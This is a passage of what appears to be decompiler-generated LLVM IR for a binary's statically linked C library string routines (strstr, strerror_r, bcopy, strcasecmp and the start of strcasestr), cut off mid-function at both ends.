  %v2_1001c1a0 = inttoptr i32 %v0_1001c120 to i8*
  %v3_1001c1a0 = load i8, i8* %v2_1001c1a0, align 1
  %v3_1001c1a4 = icmp eq i8 %v3_1001c1a0, 0
  br i1 %v3_1001c1a4, label %dec_label_pc_1001c120, label %dec_label_pc_1001c1ac

dec_label_pc_1001c1ac:                            ; preds = %dec_label_pc_1001c1a0
  %v2_1001c1ac = inttoptr i32 %v1_1001c18c to i8*
  %v3_1001c1ac = load i8, i8* %v2_1001c1ac, align 1
  %v3_1001c1b0 = icmp eq i8 %v3_1001c1ac, 0
  br i1 %v3_1001c1b0, label %dec_label_pc_1001c1e4, label %dec_label_pc_1001c1b8

dec_label_pc_1001c1b8:                            ; preds = %dec_label_pc_1001c1ac
  %v1_1001c1b8 = add i32 %v0_1001c120, 2
  %v2_1001c1b8 = inttoptr i32 %v1_1001c1b8 to i8*
  %v3_1001c1b8 = load i8, i8* %v2_1001c1b8, align 1
  store i32 %v1_1001c1b8, i32* @r10, align 4
  %v3_1001c1c0 = icmp eq i8 %v3_1001c1b8, 0
  br i1 %v3_1001c1c0, label %dec_label_pc_1001c1e4, label %dec_label_pc_1001c1c8

dec_label_pc_1001c1c8:                            ; preds = %dec_label_pc_1001c1b8
  %v1_1001c1c8 = add i32 %v0_1001c120, 3
  %v2_1001c1c8 = inttoptr i32 %v1_1001c1c8 to i8*
  %v3_1001c1c8 = load i8, i8* %v2_1001c1c8, align 1
  store i32 %v1_1001c1c8, i32* @r10, align 4
  %v3_1001c1d0 = icmp eq i8 %v3_1001c1c8, 0
  br i1 %v3_1001c1d0, label %dec_label_pc_1001c1e4, label %dec_label_pc_1001c1d8

dec_label_pc_1001c1d8:                            ; preds = %dec_label_pc_1001c1c8, %dec_label_pc_1001c180
  store i32 %v0_1001c1e8, i32* @r10, align 4
  %v2_1001c1dc = icmp ult i32 %v1_1001c184, %v0_1001c1e8
  br i1 %v2_1001c1dc, label %dec_label_pc_1001c180, label %dec_label_pc_1001c1e4

dec_label_pc_1001c1e4:                            ; preds = %dec_label_pc_1001c1d8, %dec_label_pc_1001c1ac, %dec_label_pc_1001c1b8, %dec_label_pc_1001c1c8, %dec_label_pc_1001c170, %dec_label_pc_1001c120
  %v0_1001c1f0 = phi i32 [ %v0_1001c120, %dec_label_pc_1001c120 ], [ %v0_1001c174, %dec_label_pc_1001c170 ], [ %v1_1001c1c8, %dec_label_pc_1001c1c8 ], [ %v1_1001c1b8, %dec_label_pc_1001c1b8 ], [ %v1_1001c18c, %dec_label_pc_1001c1ac ], [ %v0_1001c1e8, %dec_label_pc_1001c1d8 ]
  %v3_1001c1e4 = icmp ugt i32 %v0_1001c1e8, %v0_1001c1f0
  %v0_1001c1f0.v0_1001c1e8 = select i1 %v3_1001c1e4, i32 %v0_1001c1f0, i32 %v0_1001c1e8
  %v2_1001c1f4 = sub i32 %v0_1001c1f0.v0_1001c1e8, %v0_1001c128
  ret i32 %v2_1001c1f4

; uselistorder directives
  uselistorder i32 %v1_1001c184, { 1, 2, 0 }
  uselistorder i32 %v0_1001c120, { 0, 2, 3, 4, 7, 6, 5, 1 }
  uselistorder i32 %v0_1001c174, { 1, 0, 3, 2 }
  uselistorder i32 %v1_1001c164, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1001c158, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1001c1e8, { 1, 5, 0, 3, 4, 6, 2, 7 }
  uselistorder i32 %v1_1001c128, { 1, 0 }
  uselistorder i32 %v0_1001c128, { 4, 3, 5, 1, 0, 6, 7, 2 }
  uselistorder label %dec_label_pc_1001c1e4, { 0, 3, 2, 1, 4, 5 }
  uselistorder label %dec_label_pc_1001c180, { 1, 0 }
  uselistorder label %dec_label_pc_1001c140, { 1, 0 }
  uselistorder label %dec_label_pc_1001c138, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v3_1001c1fc = load i8, i8* %arg2, align 1
  %v4_1001c1fc = zext i8 %v3_1001c1fc to i32
  store i32 %v4_1001c1fc, i32* %r6.global-to-local, align 4
  %v3_1001c200 = icmp eq i8 %v3_1001c1fc, 0
  %v0_1001c204 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1001c200, i32 %v0_1001c204)
  %v1_1001c208 = add i32 %arg1, -1
  store i32 %v1_1001c208, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001c20c

dec_label_pc_1001c20c:                            ; preds = %dec_label_pc_1001c21c, %entry
  %v0_1001c20c = phi i32 [ %v1_1001c20c, %dec_label_pc_1001c21c ], [ %v1_1001c208, %entry ]
  %v1_1001c20c = add i32 %v0_1001c20c, 1
  %v2_1001c20c = inttoptr i32 %v1_1001c20c to i8*
  %v3_1001c20c = load i8, i8* %v2_1001c20c, align 1
  store i32 %v1_1001c20c, i32* %r3.global-to-local, align 4
  %v3_1001c210 = icmp eq i8 %v3_1001c20c, 0
  br i1 %v3_1001c210, label %dec_label_pc_1001c2e8, label %dec_label_pc_1001c21c

dec_label_pc_1001c21c:                            ; preds = %dec_label_pc_1001c20c
  %v4_1001c214 = icmp eq i8 %v3_1001c20c, %v3_1001c1fc
  br i1 %v4_1001c214, label %dec_label_pc_1001c220, label %dec_label_pc_1001c20c

dec_label_pc_1001c220:                            ; preds = %dec_label_pc_1001c21c
  %v2_1001c220 = add i32 %tmp, 1
  %v3_1001c220 = inttoptr i32 %v2_1001c220 to i8*
  %v4_1001c220 = load i8, i8* %v3_1001c220, align 1
  %v5_1001c220 = zext i8 %v4_1001c220 to i32
  store i32 %v5_1001c220, i32* %r5.global-to-local, align 4
  store i32 %v2_1001c220, i32* %r4.global-to-local, align 4
  %v3_1001c228 = icmp eq i8 %v4_1001c220, 0
  %v0_1001c22c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1001c228, i32 %v0_1001c22c)
  %v0_1001c230.sink.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001c274

dec_label_pc_1001c23c:                            ; preds = %dec_label_pc_1001c2dc
  %v3_1001c23c = load i8, i8* %storemerge4.in.in, align 1
  %v4_1001c23c = zext i8 %v3_1001c23c to i32
  store i32 %v1_1001c230, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1001c264.preheader

dec_label_pc_1001c264.preheader:                  ; preds = %dec_label_pc_1001c23c, %dec_label_pc_1001c274
  %v0_1001c26416 = phi i32 [ %v4_1001c23c, %dec_label_pc_1001c23c ], [ %storemerge4, %dec_label_pc_1001c274 ]
  %v1_1001c264.pre = load i32, i32* %r6.global-to-local, align 4
  %v4_1001c26424 = icmp eq i32 %v0_1001c26416, %v1_1001c264.pre
  %v3_1001c26826 = icmp eq i32 %v0_1001c26416, 0
  br i1 %v4_1001c26424, label %dec_label_pc_1001c274, label %dec_label_pc_1001c248

dec_label_pc_1001c248:                            ; preds = %dec_label_pc_1001c264.preheader, %dec_label_pc_1001c260
  %v3_1001c26828 = phi i1 [ %v3_1001c268, %dec_label_pc_1001c260 ], [ %v3_1001c26826, %dec_label_pc_1001c264.preheader ]
  %v0_1001c24c27 = phi i32 [ %v1_1001c260, %dec_label_pc_1001c260 ], [ %v1_1001c230, %dec_label_pc_1001c264.preheader ]
  br i1 %v3_1001c26828, label %dec_label_pc_1001c2e8, label %dec_label_pc_1001c24c

dec_label_pc_1001c24c:                            ; preds = %dec_label_pc_1001c248
  %v1_1001c24c = add i32 %v0_1001c24c27, 1
  %v2_1001c24c = inttoptr i32 %v1_1001c24c to i8*
  %v3_1001c24c = load i8, i8* %v2_1001c24c, align 1
  %v4_1001c24c = zext i8 %v3_1001c24c to i32
  store i32 %v1_1001c24c, i32* %r11.global-to-local, align 4
  %v4_1001c250 = icmp eq i32 %v4_1001c24c, %v1_1001c264.pre
  br i1 %v4_1001c250, label %dec_label_pc_1001c274, label %dec_label_pc_1001c25c

dec_label_pc_1001c25c:                            ; preds = %dec_label_pc_1001c24c
  %v3_1001c254 = icmp eq i8 %v3_1001c24c, 0
  br i1 %v3_1001c254, label %dec_label_pc_1001c2e8, label %dec_label_pc_1001c260

dec_label_pc_1001c260:                            ; preds = %dec_label_pc_1001c25c
  %v1_1001c260 = add i32 %v0_1001c24c27, 2
  %v2_1001c260 = inttoptr i32 %v1_1001c260 to i8*
  %v3_1001c260 = load i8, i8* %v2_1001c260, align 1
  %v4_1001c260 = zext i8 %v3_1001c260 to i32
  store i32 %v1_1001c260, i32* %r11.global-to-local, align 4
  %v4_1001c264 = icmp eq i32 %v4_1001c260, %v1_1001c264.pre
  %v3_1001c268 = icmp eq i8 %v3_1001c260, 0
  br i1 %v4_1001c264, label %dec_label_pc_1001c274, label %dec_label_pc_1001c248

dec_label_pc_1001c274:                            ; preds = %dec_label_pc_1001c264.preheader, %dec_label_pc_1001c260, %dec_label_pc_1001c24c, %dec_label_pc_1001c220
  %v0_1001c230.sink = phi i32 [ %v0_1001c230.sink.pre, %dec_label_pc_1001c220 ], [ %v1_1001c230, %dec_label_pc_1001c264.preheader ], [ %v1_1001c260, %dec_label_pc_1001c260 ], [ %v1_1001c24c, %dec_label_pc_1001c24c ]
  %v1_1001c230 = add i32 %v0_1001c230.sink, 1
  %storemerge4.in.in = inttoptr i32 %v1_1001c230 to i8*
  %storemerge4.in = load i8, i8* %storemerge4.in.in, align 1
  %storemerge4 = zext i8 %storemerge4.in to i32
  store i32 %v1_1001c230, i32* %r11.global-to-local, align 4
  %v1_1001c274 = load i32, i32* %r5.global-to-local, align 4
  %v4_1001c274 = icmp eq i32 %storemerge4, %v1_1001c274
  br i1 %v4_1001c274, label %dec_label_pc_1001c27c, label %dec_label_pc_1001c264.preheader

dec_label_pc_1001c27c:                            ; preds = %dec_label_pc_1001c274
  %v1_1001c27c = add i32 %v0_1001c230.sink, 2
  %v2_1001c27c = inttoptr i32 %v1_1001c27c to i8*
  %v3_1001c27c = load i8, i8* %v2_1001c27c, align 1
  %v4_1001c27c = zext i8 %v3_1001c27c to i32
  store i32 %v4_1001c27c, i32* @r10, align 4
  store i32 %v0_1001c230.sink, i32* %r3.global-to-local, align 4
  %v0_1001c284 = load i32, i32* %r4.global-to-local, align 4
  %v1_1001c284 = add i32 %v0_1001c284, 1
  %v2_1001c284 = inttoptr i32 %v1_1001c284 to i8*
  %v3_1001c284 = load i8, i8* %v2_1001c284, align 1
  %v4_1001c284 = zext i8 %v3_1001c284 to i32
  store i32 %v1_1001c284, i32* @r8, align 4
  store i32 %v1_1001c27c, i32* %r11.global-to-local, align 4
  %v4_1001c290 = icmp eq i8 %v3_1001c27c, %v3_1001c284
  br i1 %v4_1001c290, label %dec_label_pc_1001c298, label %dec_label_pc_1001c2dc

dec_label_pc_1001c298:                            ; preds = %dec_label_pc_1001c27c, %dec_label_pc_1001c2c4.dec_label_pc_1001c298_crit_edge
  %v0_1001c29c = phi i32 [ %v0_1001c29c.pre, %dec_label_pc_1001c2c4.dec_label_pc_1001c298_crit_edge ], [ %v1_1001c27c, %dec_label_pc_1001c27c ]
  %v0_1001c298 = phi i32 [ %v4_1001c2c8, %dec_label_pc_1001c2c4.dec_label_pc_1001c298_crit_edge ], [ %v4_1001c27c, %dec_label_pc_1001c27c ]
  %v3_1001c298 = icmp eq i32 %v0_1001c298, 0
  %v1_1001c29c = add i32 %v0_1001c29c, 1
  store i32 %v1_1001c29c, i32* %r7.global-to-local, align 4
  %v0_1001c2a0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1001c298, i32 %v0_1001c2a0)
  %v0_1001c2a4 = load i32, i32* @r8, align 4
  %v1_1001c2a4 = add i32 %v0_1001c2a4, 1
  %v2_1001c2a4 = inttoptr i32 %v1_1001c2a4 to i8*
  %v3_1001c2a4 = load i8, i8* %v2_1001c2a4, align 1
  %v4_1001c2a4 = zext i8 %v3_1001c2a4 to i32
  store i32 %v1_1001c2a4, i32* @r10, align 4
  %v0_1001c2ac = load i32, i32* %r11.global-to-local, align 4
  %v1_1001c2ac = add i32 %v0_1001c2ac, 1
  %v2_1001c2ac = inttoptr i32 %v1_1001c2ac to i8*
  %v3_1001c2ac = load i8, i8* %v2_1001c2ac, align 1
  %v1_1001c2b0 = add i32 %v0_1001c2a4, 2
  store i32 %v1_1001c2b0, i32* @r8, align 4
  %v0_1001c2b4 = load i32, i32* %r7.global-to-local, align 4
  %v1_1001c2b4 = add i32 %v0_1001c2b4, 1
  store i32 %v1_1001c2b4, i32* %r11.global-to-local, align 4
  %v4_1001c2bc = icmp eq i8 %v3_1001c2ac, %v3_1001c2a4
  br i1 %v4_1001c2bc, label %dec_label_pc_1001c2c4, label %dec_label_pc_1001c2dc

dec_label_pc_1001c2c4:                            ; preds = %dec_label_pc_1001c298
  %v3_1001c2b8 = icmp eq i8 %v3_1001c2a4, 0
  %v0_1001c2c4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1001c2b8, i32 %v0_1001c2c4)
  %v0_1001c2c8 = load i32, i32* @r10, align 4
  %v1_1001c2c8 = add i32 %v0_1001c2c8, 1
  %v2_1001c2c8 = inttoptr i32 %v1_1001c2c8 to i8*
  %v3_1001c2c8 = load i8, i8* %v2_1001c2c8, align 1
  %v4_1001c2c8 = zext i8 %v3_1001c2c8 to i32
  %v0_1001c2cc = load i32, i32* %r7.global-to-local, align 4
  %v1_1001c2cc = add i32 %v0_1001c2cc, 1
  %v2_1001c2cc = inttoptr i32 %v1_1001c2cc to i8*
  %v3_1001c2cc = load i8, i8* %v2_1001c2cc, align 1
  store i32 %v4_1001c2c8, i32* @r10, align 4
  %v4_1001c2d4 = icmp eq i8 %v3_1001c2cc, %v3_1001c2c8
  br i1 %v4_1001c2d4, label %dec_label_pc_1001c2c4.dec_label_pc_1001c298_crit_edge, label %dec_label_pc_1001c2dc

dec_label_pc_1001c2c4.dec_label_pc_1001c298_crit_edge: ; preds = %dec_label_pc_1001c2c4
  %v0_1001c29c.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1001c298

dec_label_pc_1001c2dc:                            ; preds = %dec_label_pc_1001c2c4, %dec_label_pc_1001c298, %dec_label_pc_1001c27c
  %v0_1001c2dc = phi i32 [ %v4_1001c284, %dec_label_pc_1001c27c ], [ %v4_1001c2c8, %dec_label_pc_1001c2c4 ], [ %v4_1001c2a4, %dec_label_pc_1001c298 ]
  %v3_1001c2dc = icmp eq i32 %v0_1001c2dc, 0
  br i1 %v3_1001c2dc, label %dec_label_pc_1001c2e4, label %dec_label_pc_1001c23c

dec_label_pc_1001c2e4:                            ; preds = %dec_label_pc_1001c2dc
  ret i32 %v0_1001c230.sink

dec_label_pc_1001c2e8:                            ; preds = %dec_label_pc_1001c20c, %dec_label_pc_1001c25c, %dec_label_pc_1001c248
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1001c2c8, { 0, 2, 1 }
  uselistorder i8 %v3_1001c2a4, { 1, 0, 2 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i8* %storemerge4.in.in, { 1, 0 }
  uselistorder i32 %v1_1001c230, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1001c230.sink, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1001c260, { 0, 2, 3, 1 }
  uselistorder i32 %v0_1001c24c27, { 1, 0 }
  uselistorder i32 %v1_1001c264.pre, { 1, 2, 0 }
  uselistorder i32 %v1_1001c20c, { 1, 2, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 0 }
  uselistorder label %dec_label_pc_1001c2e8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1001c298, { 1, 0 }
  uselistorder label %dec_label_pc_1001c274, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1001c248, { 1, 0 }
  uselistorder label %dec_label_pc_1001c264.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r4, align 4
  store i32 268550920, i32* @lr, align 4
  %v0_1001c304 = call i32 @__xpg_strerror_r()
  %v0_1001c30c = load i32, i32* @r29, align 4
  ret i32 %v0_1001c30c
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %stack_var_-39 = alloca i32, align 4
  %v0_1001c328 = load i32, i32* @r3, align 4
  %v2_1001c328 = icmp ugt i32 %v0_1001c328, 124
  %v0_1001c330 = load i32, i32* @r4, align 4
  store i32 %v0_1001c330, i32* %r27.global-to-local, align 4
  %v0_1001c338 = load i32, i32* @r5, align 4
  br i1 %v2_1001c328, label %dec_label_pc_1001c37c, label %dec_label_pc_1001c340

dec_label_pc_1001c340:                            ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_1002e4b0.1183 to i32), i32* @r30, align 4
  %v3_1001c3644 = icmp eq i32 %v0_1001c328, 0
  br i1 %v3_1001c3644, label %dec_label_pc_1001c370, label %dec_label_pc_1001c350

dec_label_pc_1001c350:                            ; preds = %dec_label_pc_1001c340, %dec_label_pc_1001c350
  br label %dec_label_pc_1001c350

dec_label_pc_1001c370:                            ; preds = %dec_label_pc_1001c340
  store i32 0, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1001c3b0

dec_label_pc_1001c37c:                            ; preds = %entry
  %tmp = icmp slt i32 %v0_1001c328, 0
  %v1_1001c380 = zext i1 %tmp to i32
  %v2_1001c380 = ashr i32 %v0_1001c328, 31
  %v3_1001c380 = and i32 %v2_1001c380, -2
  %v4_1001c380 = or i32 %v3_1001c380, %v1_1001c380
  store i32 22, i32* %r28.global-to-local, align 4
  %v5_1001c394 = bitcast i32* %stack_var_-39 to i8*
  %v6_1001c394 = call i32 @_uintmaxtostr(i8* %v5_1001c394, i32 %v4_1001c380, i32 %v0_1001c328, i32 -10, i32 0)
  %v1_1001c39c = add i32 %v6_1001c394, -14
  store i32 %v1_1001c39c, i32* @r30, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_1002e4a0.1184 to i32), i32* @r4, align 4
  store i32 %v1_1001c39c, i32* @r3, align 4
  store i32 14, i32* @r5, align 4
  store i32 268551088, i32* @lr, align 4
  %v0_1001c3ac = call i32 @memcpy()
  %v0_1001c3b0.pre = load i32, i32* %r27.global-to-local, align 4
  %v0_1001c3b4.pre = load i32, i32* @r30, align 4
  %v0_1001c3c4.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1001c3b0

dec_label_pc_1001c3b0:                            ; preds = %dec_label_pc_1001c370, %dec_label_pc_1001c37c
  %v0_1001c3c4 = phi i32 [ %v0_1001c338, %dec_label_pc_1001c370 ], [ %v0_1001c3c4.pre, %dec_label_pc_1001c37c ]
  %v0_1001c3b4 = phi i32 [ ptrtoint ([8 x i8]* @global_var_1002e4b0.1183 to i32), %dec_label_pc_1001c370 ], [ %v0_1001c3b4.pre, %dec_label_pc_1001c37c ]
  %v1_1001c3b8 = phi i32 [ %v0_1001c330, %dec_label_pc_1001c370 ], [ %v0_1001c3b0.pre, %dec_label_pc_1001c37c ]
  %tmp21 = icmp slt i32 %v1_1001c3b8, 0
  %v1_1001c3b0 = zext i1 %tmp21 to i32
  %v2_1001c3b0 = ashr i32 %v1_1001c3b8, 31
  %v3_1001c3b0 = and i32 %v2_1001c3b0, -2
  %v4_1001c3b0 = or i32 %v3_1001c3b0, %v1_1001c3b0
  store i32 %v0_1001c3b4, i32* @r3, align 4
  %v2_1001c3b8 = xor i32 %v4_1001c3b0, %v1_1001c3b8
  %v2_1001c3bc = sub i32 %v4_1001c3b0, %v2_1001c3b8
  %tmp22 = icmp slt i32 %v2_1001c3bc, 0
  %v1_1001c3c0 = zext i1 %tmp22 to i32
  %v2_1001c3c0 = ashr i32 %v2_1001c3bc, 31
  %v3_1001c3c0 = and i32 %v2_1001c3c0, -2
  %v4_1001c3c0 = or i32 %v3_1001c3c0, %v1_1001c3c0
  %v2_1001c3c4 = and i32 %v4_1001c3c0, %v0_1001c3c4
  store i32 %v2_1001c3c4, i32* @r29, align 4
  %v0_1001c3c8 = call i32 @__GI_strlen()
  %v1_1001c3cc = add i32 %v0_1001c3c8, 1
  store i32 %v1_1001c3cc, i32* @r31, align 4
  %v1_1001c3d0 = load i32, i32* @r29, align 4
  %v3_1001c3d0 = icmp ugt i32 %v1_1001c3cc, %v1_1001c3d0
  br i1 %v3_1001c3d0, label %dec_label_pc_1001c3d8, label %dec_label_pc_1001c3e0

dec_label_pc_1001c3d8:                            ; preds = %dec_label_pc_1001c3b0
  store i32 %v1_1001c3d0, i32* @r31, align 4
  store i32 34, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1001c3e0

dec_label_pc_1001c3e0:                            ; preds = %dec_label_pc_1001c3b0, %dec_label_pc_1001c3d8
  %v0_1001c3f0 = phi i32 [ %v1_1001c3d0, %dec_label_pc_1001c3d8 ], [ %v1_1001c3cc, %dec_label_pc_1001c3b0 ]
  %v3_1001c3e0 = icmp eq i32 %v0_1001c3f0, 0
  br i1 %v3_1001c3e0, label %dec_label_pc_1001c404, label %dec_label_pc_1001c3e8

dec_label_pc_1001c3e8:                            ; preds = %dec_label_pc_1001c3e0
  %v0_1001c3e8 = load i32, i32* @r30, align 4
  store i32 %v0_1001c3e8, i32* @r4, align 4
  %v0_1001c3ec = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_1001c3ec, i32* @r3, align 4
  store i32 %v0_1001c3f0, i32* @r5, align 4
  store i32 268551160, i32* @lr, align 4
  %v0_1001c3f4 = call i32 @memcpy()
  %v1_1001c3f8 = load i32, i32* @r31, align 4
  %v2_1001c3f8 = add i32 %v1_1001c3f8, %v0_1001c3ec
  %v3_1001c400 = add i32 %v2_1001c3f8, -1
  %v4_1001c400 = inttoptr i32 %v3_1001c400 to i8*
  store i8 0, i8* %v4_1001c400, align 1
  br label %dec_label_pc_1001c404

dec_label_pc_1001c404:                            ; preds = %dec_label_pc_1001c3e0, %dec_label_pc_1001c3e8
  %v0_1001c404 = load i32, i32* %r28.global-to-local, align 4
  %v3_1001c404 = icmp eq i32 %v0_1001c404, 0
  br i1 %v3_1001c404, label %dec_label_pc_1001c414, label %dec_label_pc_1001c40c

dec_label_pc_1001c40c:                            ; preds = %dec_label_pc_1001c404
  %v0_1001c40c = call i32 @__errno_location()
  %v0_1001c410 = load i32, i32* %r28.global-to-local, align 4
  %v2_1001c410 = inttoptr i32 %v0_1001c40c to i32*
  store i32 %v0_1001c410, i32* %v2_1001c410, align 4
  %v0_1001c418.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1001c414

dec_label_pc_1001c414:                            ; preds = %dec_label_pc_1001c404, %dec_label_pc_1001c40c
  %v0_1001c418 = phi i32 [ 0, %dec_label_pc_1001c404 ], [ %v0_1001c418.pre, %dec_label_pc_1001c40c ]
  ret i32 %v0_1001c418

; uselistorder directives
  uselistorder i32 %v2_1001c3bc, { 1, 0 }
  uselistorder i32 %v4_1001c3b0, { 1, 0 }
  uselistorder i32 %v1_1001c3b8, { 1, 2, 0 }
  uselistorder i32 %v0_1001c328, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r28.global-to-local, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32* %r27.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1001c414, { 1, 0 }
  uselistorder label %dec_label_pc_1001c404, { 1, 0 }
  uselistorder label %dec_label_pc_1001c3e0, { 1, 0 }
  uselistorder label %dec_label_pc_1001c3b0, { 1, 0 }
  uselistorder label %dec_label_pc_1001c350, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_1001c438 = call i32 @memmove(i32 %arg2, i32 %arg1)
  ret i32 %v2_1001c438
}

define i32 @__GI_strcasecmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_1001c440 = load i32, i32* bitcast (i32** @global_var_10045144.1185 to i32*), align 4
  store i32 %v3_1001c440, i32* @r10, align 4
  %v0_1001c448.pre = load i32, i32* @r3, align 4
  %v1_1001c448.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1001c448

dec_label_pc_1001c448:                            ; preds = %dec_label_pc_1001c470, %entry
  %v0_1001c4846 = phi i32 [ %v0_1001c4847, %dec_label_pc_1001c470 ], [ 0, %entry ]
  %v0_1001c474 = phi i32 [ %v1_1001c474, %dec_label_pc_1001c470 ], [ %v1_1001c448.pre, %entry ]
  %v0_1001c478 = phi i32 [ %v1_1001c478, %dec_label_pc_1001c470 ], [ %v0_1001c448.pre, %entry ]
  %v4_1001c448 = icmp eq i32 %v0_1001c478, %v0_1001c474
  %.pre = inttoptr i32 %v0_1001c478 to i8*
  br i1 %v4_1001c448, label %dec_label_pc_1001c470, label %dec_label_pc_1001c450

dec_label_pc_1001c450:                            ; preds = %dec_label_pc_1001c448
  %v2_1001c450 = load i8, i8* %.pre, align 1
  %v3_1001c450 = zext i8 %v2_1001c450 to i32
  %v1_1001c454 = inttoptr i32 %v0_1001c474 to i8*
  %v2_1001c454 = load i8, i8* %v1_1001c454, align 1
  %v3_1001c454 = zext i8 %v2_1001c454 to i32
  %v1_1001c458 = mul nuw nsw i32 %v3_1001c450, 2
  %v1_1001c45c = mul nuw nsw i32 %v3_1001c454, 2
  %v2_1001c460 = add i32 %v1_1001c458, %v3_1001c440
  %v3_1001c460 = inttoptr i32 %v2_1001c460 to i16*
  %v4_1001c460 = load i16, i16* %v3_1001c460, align 2
  %v5_1001c460 = sext i16 %v4_1001c460 to i32
  %v2_1001c464 = add i32 %v1_1001c45c, %v3_1001c440
  %v3_1001c464 = inttoptr i32 %v2_1001c464 to i16*
  %v4_1001c464 = load i16, i16* %v3_1001c464, align 2
  %v5_1001c464 = sext i16 %v4_1001c464 to i32
  %v2_1001c468 = sub nsw i32 %v5_1001c460, %v5_1001c464
  %v4_1001c46c = icmp eq i16 %v4_1001c460, %v4_1001c464
  br i1 %v4_1001c46c, label %dec_label_pc_1001c470, label %dec_label_pc_1001c484

dec_label_pc_1001c470:                            ; preds = %dec_label_pc_1001c448, %dec_label_pc_1001c450
  %v0_1001c4847 = phi i32 [ %v2_1001c468, %dec_label_pc_1001c450 ], [ %v0_1001c4846, %dec_label_pc_1001c448 ]
  %v2_1001c470 = load i8, i8* %.pre, align 1
  %v1_1001c474 = add i32 %v0_1001c474, 1
  %v1_1001c478 = add i32 %v0_1001c478, 1
  %v3_1001c47c = icmp eq i8 %v2_1001c470, 0
  br i1 %v3_1001c47c, label %dec_label_pc_1001c484, label %dec_label_pc_1001c448

dec_label_pc_1001c484:                            ; preds = %dec_label_pc_1001c470, %dec_label_pc_1001c450
  %v0_1001c484 = phi i32 [ %v0_1001c4847, %dec_label_pc_1001c470 ], [ %v2_1001c468, %dec_label_pc_1001c450 ]
  ret i32 %v0_1001c484

; uselistorder directives
  uselistorder i32 %v2_1001c468, { 1, 0 }
  uselistorder i32 %v0_1001c478, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1001c470, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %tmp, i32* %r8.global-to-local, align 4
  %v3_1001c494 = load i32, i32* bitcast (i32** @global_var_10045144.1185 to i32*), align 4
  store i32 %v3_1001c494, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1001c49c

dec_label_pc_1001c49c:                            ; preds = %dec_label_pc_1001c49c.backedge, %entry
  %v0_1001c49c = phi i32 [ %v0_1001c49c.pre, %dec_label_pc_1001c49c.backedge ], [ %arg2, %entry ]
  %v1_1001c49c = inttoptr i32 %v0_1001c49c to i8*
  %v2_1001c49c = load i8, i8* %v1_1001c49c, align 1
  %v3_1001c49c = zext i8 %v2_1001c49c to i32
  store i32 %v3_1001c49c, i32* %r0.global-to-local, align 4
  %v1_1001c4a0 = add i32 %v0_1001c49c, 1
  store i32 %v1_1001c4a0, i32* %r10.global-to-local, align 4
  %v3_1001c4a4 = icmp eq i8 %v2_1001c49c, 0
  %v1_1001c4a8 = mul nuw nsw i32 %v3_1001c49c, 2
  store i32 %v1_1001c4a8, i32* %r9.global-to-local, align 4
  %v0_1001c4ac = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1001c4a4, i32 %v0_1001c4ac)
  %v0_1001c4b0 = load i32, i32* %r8.global-to-local, align 4
  %v1_1001c4b0 = inttoptr i32 %v0_1001c4b0 to i8*
  %v2_1001c4b0 = load i8, i8* %v1_1001c4b0, align 1
